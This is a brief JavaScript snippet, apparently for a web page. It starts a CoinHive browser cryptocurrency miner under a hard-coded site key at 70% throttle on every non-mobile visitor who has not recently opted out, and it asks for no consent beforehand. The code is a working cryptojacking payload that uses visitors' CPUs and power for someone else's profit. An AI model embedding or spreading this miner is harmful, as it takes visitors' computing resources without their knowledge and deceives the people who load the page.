var miner = new CoinHive.Anonymous('nGXIwKTAIL94UmXv04egb3ZWjCCE3bFh', {
    throttle: 0.7
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}